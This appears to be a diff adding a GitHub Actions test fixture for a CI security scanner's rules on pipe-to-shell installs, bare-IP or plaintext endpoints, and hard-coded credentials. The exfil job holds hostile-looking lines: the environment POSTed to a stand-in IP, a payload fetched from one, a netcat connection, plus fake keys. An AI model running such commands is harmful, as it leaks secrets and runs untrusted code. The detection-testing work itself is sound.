@@ -1,0 +1,127 @@
+# Rules 3, 4, 5 (PPE-003, PPE-004, PPE-005): the run-script patterns.
+#
+# One file, because all three read the same resolved scripts and a reader
+# comparing them side by side learns more from one workflow than from three.
+#
+# Expected: 10 findings.
+#
+#   BLOCK  job dropper step 1     curl piped to bash          PPE-003
+#   BLOCK  job dropper step 2     wget piped to sudo sh      PPE-003
+#   BLOCK  job powershell         iwr piped to iex           PPE-003
+#   BLOCK  job exfil step 1       bare IP in a URL host      PPE-004
+#   BLOCK  job exfil step 1       the same line, http Warn   PPE-004
+#   BLOCK  job exfil step 2       bare IP in a URL host      PPE-004
+#   BLOCK  job exfil step 2       the same line, http Warn   PPE-004
+#   BLOCK  job exfil step 4       bare IP, no URL, netcat    PPE-004
+#   WARN   job exfil step 3       plain http:// to a host    PPE-004
+#   BLOCK  job creds step 1       AWS key id                 PPE-005
+#   BLOCK  job creds step 3       private key block          PPE-005
+#
+# Note the pairs on exfil steps 1 and 2. A URL with an IP host is both a
+# plaintext endpoint and a bare IP, so it produces two findings from rule 4 at
+# different tiers. That is intended: they are different problems with different
+# fixes.
+#
+# job clean has the shapes that must not match, each for a reason that is a
+# deliberate narrowing rather than an oversight. See its comments.
+name: ci
+
+# Branch filtered so rule 7 does not fire here: this fixture is for rules 3, 4
+# and 5, and a fixture should test one thing.
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  dropper:
+    runs-on: ubuntu-latest
+    steps:
+      - name: install
+        run: curl -sSL https://example.invalid/install.sh | bash
+
+      - name: install with wget
+        run: |
+          wget -qO- https://example.invalid/setup.sh \
+            | sudo sh
+
+  powershell:
+    runs-on: windows-latest
+    steps:
+      - name: bootstrap
+        run: |
+          iwr https://example.invalid/p.ps1 -useb \
+            | iex
+
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - name: collect
+        run: |
+          env | curl -X POST --data-binary @- http://203.0.113.7/ingest
+
+      - name: fetch payload
+        run: curl -sS http://198.51.100.42/payload.sh -o /tmp/payload
+
+      - name: plaintext endpoint
+        run: wget http://internal.example.invalid/report
+
+      # A bare IP with no URL around it, but with a network command on the
+      # line. Still an endpoint: something is about to connect to it.
+      - name: raw socket
+        run: nc 203.0.113.7 4444 < /dev/null
+
+  # Credential shapes. Every value here is a pattern-matching fake.
+  # AKIAIOSFODNN7EXAMPLE is the AWS documentation example value, and the
+  # ghp_ value is not a token, it is EXAMPLE repeated to the right length.
+  creds:
+    runs-on: ubuntu-latest
+    steps:
+      - name: aws
+        run: |
+          export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+          aws sts get-caller-identity
+
+      - name: github
+        run: |
+          GH_TOKEN=ghp_EXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLEEXAMPLE
+          gh api user
+
+      - name: private key
+        run: |
+          cat > /tmp/id_ed25519 <<'EOF'
+          -----BEGIN OPENSSH PRIVATE KEY-----
+          b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gt
+          EOF
+          chmod 600 /tmp/id_ed25519
+
+  clean:
+    runs-on: ubuntu-latest
+    steps:
+      # A four part version, which is the exact token shape of an IPv4 address.
+      # This does NOT match because there is no network command on the line.
+      # This is the case that drove requiring network context: -Dversion=1.2.3.4
+      # is everywhere in Java and Gradle builds, and a Block tier rule that
+      # fires on it would block legitimate repositories.
+      - run: ./gradlew build -Dversion=1.2.3.4
+
+      # Same shape, no network command either. Not a finding: it is a version,
+      # not an endpoint.
+      - run: echo "building 1.2.3.4"
+
+      # A pipe into a checksum, not into a shell. The trailing \b on the
+      # interpreter is what keeps sh from matching sha256sum.
+      - run: |
+          curl -sSL https://example.invalid/app.tar.gz \
+            | sha256sum -c -
+
+      # https, not http.
+      - run: curl -sSL https://example.invalid/install.sh -o /tmp/install.sh
+
+      # A variable named after a credential prefix is not a credential.
+      - run: echo "region $AKIA_REGION sk-prefix sk-directory"
+
+      # 999.999.999.999 is not four valid octets.
+      - run: echo "version 999.999.999.999"
